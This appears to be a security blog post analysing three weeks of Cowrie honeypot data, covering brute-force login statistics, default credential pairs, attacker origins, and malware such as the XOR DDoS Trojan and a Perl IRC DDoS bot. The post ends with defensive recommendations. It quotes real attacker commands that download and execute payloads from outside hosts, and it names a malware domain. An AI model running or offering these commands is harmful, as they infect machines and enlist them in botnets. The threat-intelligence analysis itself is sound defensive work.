---
layout: post
title: Cowrie Honeypot Analysis Results
tags: [Security, Honeypot]
---
During the period 16th of August 2017 to 6th of September 2017 a honeypot was deployed utilising the open source honeypot software Cowrie. Cowrie is a medium interaction SSH and Telnet honeypot designed to log brute force attacks and the shell interaction performed by the attacker. The honeypot was deployed on a Digital Ocean virtual private server (VPS) located in San Francisco, US. The honeypot was deployed as a research honeypot for the purpose of gaining threat intelligence on attackers as they interacted with the honeypot. 
The honeypot was deployed with a Splunk universal forwarder which sent the data recorded by the honeypot to a Splunk Enterprise instance, also deployed via Digital Ocean. The app ‘Tango Honeypot Intelligence’ was used to interpret Cowrie logs and provide actionable Cyber Threat Intelligence (CTI) and statistics. Overall the honeypot was successful receiving multiple connections and scans a day, whilst providing useful threat information and malware specimens to be analysed. This Intelligence report will discuss the results of the honeypot exercise and provide analysis on attacker interactions with the honeypot.

###Connections
Over the 22 days that the honey pot was active, there were a total of 1754 different IP addresses interacted with the honeypot in the form of either successful or unsuccessful connections. There were 16,527 login attempts throughout the life of the honeypot with 2074 successful attempts and 14,453 failed attempts. This equates to approximately 80 different IP addresses connecting the honeypot per day, with 751 attempted logins a day. It is noted that the days of high activity occurred on a Friday, Saturday or Sunday meaning that attackers were active over Weekend periods. The day of lowest activity, aside from the day the honeypot was launched was a Monday. 

###Username and Passwords
The following table details the top 10 usernames attempted by attackers 

Username | Count
--- | ---

admin |	6648
root	| 2599
support	| 604
service |	363
usuario |	358
user	| 355
ubnt	| 354
test	| 336
ubuntu	| 204
pi	| 200

The top 10 usernames attempted show a number of standard usernames which one would expect to see, such as ‘admin’, ‘root’, ‘support’ and ‘service’ and some interesting usernames as well. Of note, the username ‘usuario’ is the Spanish word for user. The username ‘ubnt’ is the default password for [Ubiquity’s UniFi Access Points]( https://help.ubnt.com/hc/en-us/articles/204909374-UniFi-What-is-the-default-username-password-for-UAPs-and-controller-), which have an SSH connection capability. The username ‘pi’ is also the default username for [Rasbian Linux]( https://www.raspberrypi.org/documentation/linux/usage/users.md), the standard operating system for Raspberry Pi’s. 
The following table details the top 10 passwords attempted by attackers:
Password |	Count
--- | ---
 	| 754
password |	735
123456 |	730
admin |	610
1234 | 542
support |	539
12345	| 525
default	| 512
admin1	| 437
admin1234	| 422

The top 10 passwords are what would be expected as standard for a honeypot, with a blank password, ‘password’ and ‘123456’ taking equal share of the top three attempted passwords. It is assessed that attackers would have been using a standard password dictionary file to brute force logins to the honeypot.
The following table details the top 10 username and password combinations:
Username/Password Combination |	Count
--- | ---
root/	 | 688
support/support	| 517
admin/admin	| 500
admin/default	| 449
admin/password	| 441
admin/admin1	| 421
admin/12345	| 420
admin/admin1234	| 406
admin/aerohive	| 401
admin/admin123	| 399

The top 10 username and password combinations essentially combine the top two usernames with the top 10 passwords. The one exception to this is the username and password combination ‘admin/aerohive’. This username and password combination is the default username and password for [Aerohive Networks]( https://www.cleancss.com/router-default/Aerohive/HiveAP_350) range of routers and wireless access points. 

###Locations
The Tango Honeypot Intelligence app provides locational data on the IPs that interact with the honeypot. This information cannot be relied upon or used for attribution as it only determines the location of the device that interacted with the device. An attacker may be interacting with the honeypot through a VPN or VPS located in another country. 
The following graph demonstrates the top 5 countries that scanned the honeypot:
 [Top 5 logged in countries](/img/loginCountry.png)

The following graph demonstrates the top 5 countries that logged into the honeypot:

[Top 5 logged in countries](/img/scannedCountry.png)

The prominent presence of Vietnam in scanning and China in successful logins is consisted with results produced by [Kaspersky’s IoT honeytrap labs]( https://securelist.com/honeypots-and-the-internet-of-things/78751/) in 2016, where these two nations were the top two nations conducting attacks (Kuskov et al., 2017). All nations, with the exception of France both feature in Kaspersky’s results as well as in [Ryan Chinn’s Honeypot and IoT analysis]( https://msmis.eller.arizona.edu/sites/msmis/files/documents/sfs_papers/ryan_chinn_sfs_masters_paper_0.pdf) which indicates that attacks and scans from these nations are a common occurrence. 

###Sessions
A session is defined as a successful login and the execution of commands within the honeypot. Of the 2074 successful logins, there were only 926 sessions with commands executed. The top 10 commands run on the honeypot are detailed in the following table:
Command Entered |	Count
--- | ---
uname -a	| 1606
free -m	| 84
ps x	| 74
uname	| 42
uname	| 42
cat /proc/cpuinfo	|28
wget https://rootr258.000webhostapp.com/arhive/perl.pl&&perl perl.pl&&perl perl.pl&&rm -rf perl.pl&&uname -a	| 23
wget https://rootr258.000webhostapp.com/arhive/perl.pl	| 23
uname -a && cat /etc/issue	| 22
cat /etc/issue	| 22

The vast majority of IP’s that connected to the honeypot executed ‘uname -a’ as their only commands and then ended their session. Often attackers would execute the top three commands, ‘uname -a’, ‘free -m’ and ‘ps x’ in the one session. It is assessed that this behaviour is that of an automated script or bot designed to brute force the SSH login and then gather information on the victim PC by obtaining the system version, memory information and running processes. Automating this process would allow an attacker to review the information to determine potential targets for them to further explore.
The two ‘wget’ commands in the top 10 were all performed by the same IP located in France across 23 sessions. The attacker initially downloaded the file with the ‘wget’ command and then downloaded the file again and attempted to execute and then remove the file. 
Human vs Bot Interaction
The Tango Honeypot Intelligence app provides data on what is assessed as human interaction and what is assessed as bot interaction. This assessment is performed based on the timestamps of the interaction. Interactions where the number of commands entered seem suspicious for the length of the session are often identified as bots, interactions that are longer will be identified as being potentially human. The following graph demonstrates the level of human versus bot interaction with the honeypot. 
 [Human Vs Bot](/img/botVhuman.png)

There were only 8 unique files downloaded to the honeypot with the majority of these being performed by suspected bots. A typical bot download would involve the use of the following command - wget http://157.52.151.116/a21jj curl -O http://157.52.151.116/a21jj chmod +x a21jj ./a21jj. This command downloads the piece of malware, makes it executable and then executes the file. The final command the attacker executes is – ls -la /var/run/gcc.pid. The presence of /var/run/gcc.pid confirms the presence of the [XOR DDOS Trojan]( https://blog.checkpoint.com/wp-content/uploads/2015/10/sb-report-threat-intelligence-groundhog.pdf).
There were sessions where attackers attempted to extract system information from the system, this ranged from data on the system itself such as iptables and cpu information through to extracting SSH keys and /etc/shadow and /etc/password. In one occurrence, the attacker pipped this system information into gzip and then encoded it using base64. However, in all sessions in which the attacker probed for system information and prepared it for extraction there is no evidence of any extraction occurring from the system. 
The third type of session that was observed was one in which the attacker will login to the system and then immediately clear all history and remove all log files. The attacker will then go through and recreate each of these files using the touch command. This behaviour was performed twice by one individual IP address located in New Delhi, India with no evidence that they had connected to the honeypot prior. 

###Malware Analysis
There were 48 files downloaded to the honeypot, only 8 generated unique SHA256 hashes. Of these 8 files, 5 were ELF files, two were perl scripts and one was a python script. The python script was downloaded and not executed on the honeypot. Reviewing the python scripted identified it as a script that connected to speedtest.net and provided command line speedtest.net data. However, after investigating the URL the script was downloaded from, the site redirected to mrreacher.com, which appears to be an individual from Romania, who has coded a number of DDOS along with game hacks and cheats. It is assessed that the speedtest.net script was downloaded as part of reconnaissance being conducted by ‘Mr Reacher’. 
The two perl scripts are both identical with the exception of the information provided in their comments. Both scripts identify themselves as being a ‘DDOS Perl IrcBot v1.0’, however one states it was created in 2012 by ‘DDOS Security Team’ and the other being created in 2013 by ‘vK’. Both of these files were executed on the honeypot. 
The 5 ELF files were identified as being the XOR DDOS Trojan by [VirusTotal.com]( https://www.virustotal.com/). Running each of these ELF files through [detux.org]( https://detux.org/); a Linux Sandbox system, it was identified that all 5 executables attempted to connect to the same domain ww.gzcfr5axf7.com. The executables then attempted to make UDP connections out to 39 different IP Addresses. The manner in which these files were executed on the honeypot also confirms that they are the XOR DDOS Trojan, each of the attackers were identified as being bots by Tango Honeypot Intelligence due to the automated manner and speed in which they executed their commands and they each looked to confirm the presence of /var/run/gcc.pid after executing. 

###Recommendations
Based on the Cyber Threat Intelligence gathered by the honeypot exercise. The following are the recommendations for securing a network against the attacks seen on the Cowrie honeypot:
- Disable root login over SSH – This will prevent attackers from gaining root level permissions if they are able to brute force a login.
- Limit failed SSH login attempts – This will prevent brute force attacks, by limiting their effectiveness or by blocking the IP after too many failed attempts. 
- Use SSH Public Keys – By disabling password authentication and enabling SSH public keys, attackers will be unable to brute force access to the server
- Block known IP addresses – The IP addresses that interacted with the honeypot should be blocked via firewall rules or IPS. This ensures that known attackers cannot continue to attack in the future.
- Block malicious domains and IP addresses – The domains and IP addresses that are known to contain malware should be blocked from being connected from within the network.
- Integrate XOR DDOS Bot data into SIEM – The honeypot provided valuable data on how the XOR DDOS Trojan interacted once it was able to brute force a connection. Implementing alerts within a SIEM application for commands such as ‘ls -la /var/run/gcc.pid’ would alert to the potential for this bot running within the network.
- Integrate File Integrity Monitoring (FIM) into SIEM – By integrating FIM into SIEM, it will provide greater information on the modification of files by malware, as well as alert of the presence of known malware.

###Conclusion
The deployment of a Cowrie honeypot was effective in gaining valuable Cyber Threat Intelligence on attackers and their activities. From the data collected it was evident that a large number of automated scripts and bots were active in brute forcing their way into the system. The presence of the XOR DDOS Trojan on the system further confirms that bots were active in targeting the network. The vast majority of interactions with the honeypot is assessed to be bots that are conducting reconnaissance activities by obtaining information on the system. It is assessed that these bots then feed this information back to attackers for them to assess whether the system is a potential target of value. The Cyber Threat Intelligence gained by the honeypot allows network defenders to strengthen their networks from the threats observed by implementing the recommendations made in this report.
